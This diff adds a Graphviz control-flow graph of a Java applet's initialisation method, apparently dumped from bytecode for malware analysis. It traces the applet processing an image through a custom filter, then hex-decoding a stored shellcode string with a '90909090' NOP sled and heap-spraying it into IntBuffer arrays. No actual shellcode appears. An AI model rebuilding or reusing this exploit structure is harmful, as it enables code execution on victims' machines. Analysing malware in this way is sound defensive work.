@@ -1,0 +1,84 @@
+digraph "" {
+    "r0 := @this: vmain"
+    "load.r r0"
+    "r0 := @this: vmain"->"load.r r0";
+    "load.r r0"->"load.r r0";
+    "load.r r0"->"load.r r0";
+    "virtualinvoke <vmain: java.net.URL getCodeBase()>"
+    "load.r r0"->"virtualinvoke <vmain: java.net.URL getCodeBase()>";
+    "push \"logo.png\""
+    "virtualinvoke <vmain: java.net.URL getCodeBase()>"->"push \"logo.png\"";
+    "virtualinvoke <vmain: java.awt.Image getImage(java.net.URL,java.lang.String)>"
+    "push \"logo.png\""->"virtualinvoke <vmain: java.awt.Image getImage(java.net.URL,java.lang.String)>";
+    "fieldput <vmain: java.awt.Image src>"
+    "virtualinvoke <vmain: java.awt.Image getImage(java.net.URL,java.lang.String)>"->"fieldput <vmain: java.awt.Image src>";
+    "new java.awt.MediaTracker"
+    "fieldput <vmain: java.awt.Image src>"->"new java.awt.MediaTracker";
+    "store.r $r5"
+    "new java.awt.MediaTracker"->"store.r $r5";
+    "load.r $r5"
+    "store.r $r5"->"load.r $r5";
+    "load.r $r5"->"load.r r0";
+    "specialinvoke <java.awt.MediaTracker: void <init>(java.awt.Component)>"
+    "load.r r0"->"specialinvoke <java.awt.MediaTracker: void <init>(java.awt.Component)>";
+    "specialinvoke <java.awt.MediaTracker: void <init>(java.awt.Component)>"->"load.r $r5";
+    "load.r $r5"->"load.r r0";
+    "fieldget <vmain: java.awt.Image src>"
+    "load.r r0"->"fieldget <vmain: java.awt.Image src>";
+    "push 0"
+    "fieldget <vmain: java.awt.Image src>"->"push 0";
+    "virtualinvoke <java.awt.MediaTracker: void addImage(java.awt.Image,int)>"
+    "push 0"->"virtualinvoke <java.awt.MediaTracker: void addImage(java.awt.Image,int)>";
+    "virtualinvoke <java.awt.MediaTracker: void addImage(java.awt.Image,int)>"->"load.r $r5";
+    "virtualinvoke <java.awt.MediaTracker: void waitForAll()>"
+    "load.r $r5"->"virtualinvoke <java.awt.MediaTracker: void waitForAll()>";
+    "goto load.r $r5"
+    "virtualinvoke <java.awt.MediaTracker: void waitForAll()>"->"goto load.r $r5";
+    "goto load.r $r5"->"load.r $r5";
+    "load.r $r5"->"load.r r0";
+    "load.r r0"->"fieldget <vmain: java.awt.Image src>";
+    "virtualinvoke <java.awt.MediaTracker: void removeImage(java.awt.Image)>"
+    "fieldget <vmain: java.awt.Image src>"->"virtualinvoke <java.awt.MediaTracker: void removeImage(java.awt.Image)>";
+    "virtualinvoke <java.awt.MediaTracker: void removeImage(java.awt.Image)>"->"load.r r0";
+    "load.r r0"->"load.r r0";
+    "new java.awt.image.FilteredImageSource"
+    "load.r r0"->"new java.awt.image.FilteredImageSource";
+    "dup1.r"
+    "new java.awt.image.FilteredImageSource"->"dup1.r";
+    "dup1.r"->"load.r r0";
+    "load.r r0"->"fieldget <vmain: java.awt.Image src>";
+    "virtualinvoke <java.awt.Image: java.awt.image.ImageProducer getSource()>"
+    "fieldget <vmain: java.awt.Image src>"->"virtualinvoke <java.awt.Image: java.awt.image.ImageProducer getSource()>";
+    "new vsub"
+    "virtualinvoke <java.awt.Image: java.awt.image.ImageProducer getSource()>"->"new vsub";
+    "new vsub"->"dup1.r";
+    "specialinvoke <vsub: void <init>()>"
+    "dup1.r"->"specialinvoke <vsub: void <init>()>";
+    "specialinvoke <java.awt.image.FilteredImageSource: void <init>(java.awt.image.ImageProducer,java.awt.image.ImageFilter)>"
+    "specialinvoke <vsub: void <init>()>"->"specialinvoke <java.awt.image.FilteredImageSource: void <init>(java.awt.image.ImageProducer,java.awt.image.ImageFilter)>";
+    "virtualinvoke <vmain: java.awt.Image createImage(java.awt.image.ImageProducer)>"
+    "specialinvoke <java.awt.image.FilteredImageSource: void <init>(java.awt.image.ImageProducer,java.awt.image.ImageFilter)>"->"virtualinvoke <vmain: java.awt.Image createImage(java.awt.image.ImageProducer)>";
+    "fieldput <vmain: java.awt.Image dst>"
+    "virtualinvoke <vmain: java.awt.Image createImage(java.awt.image.ImageProducer)>"->"fieldput <vmain: java.awt.Image dst>";
+    "fieldput <vmain: java.awt.Image dst>"->"load.r r0";
+    "load.r r0"->"load.r r0";
+    "staticget <vmain: java.lang.String scc>"
+    "load.r r0"->"staticget <vmain: java.lang.String scc>";
+    "staticinvoke <vmain: short[] HexDecode(java.lang.String)>"
+    "staticget <vmain: java.lang.String scc>"->"staticinvoke <vmain: short[] HexDecode(java.lang.String)>";
+    "push \"90909090\""
+    "staticinvoke <vmain: short[] HexDecode(java.lang.String)>"->"push \"90909090\"";
+    "push \"90909090\""->"staticinvoke <vmain: short[] HexDecode(java.lang.String)>";
+    "virtualinvoke <vmain: java.nio.IntBuffer[] mspray(short[],short[])>"
+    "staticinvoke <vmain: short[] HexDecode(java.lang.String)>"->"virtualinvoke <vmain: java.nio.IntBuffer[] mspray(short[],short[])>";
+    "fieldput <vmain: java.nio.IntBuffer[] mem>"
+    "virtualinvoke <vmain: java.nio.IntBuffer[] mspray(short[],short[])>"->"fieldput <vmain: java.nio.IntBuffer[] mem>";
+    "goto return"
+    "fieldput <vmain: java.nio.IntBuffer[] mem>"->"goto return";
+    "return"
+    "goto return"->"return";
+    "store.r r0"
+    "virtualinvoke <vmain: java.nio.IntBuffer[] mspray(short[],short[])>"->"store.r r0";
+    "store.r $r17"
+    "virtualinvoke <java.awt.MediaTracker: void waitForAll()>"->"store.r $r17";
+}
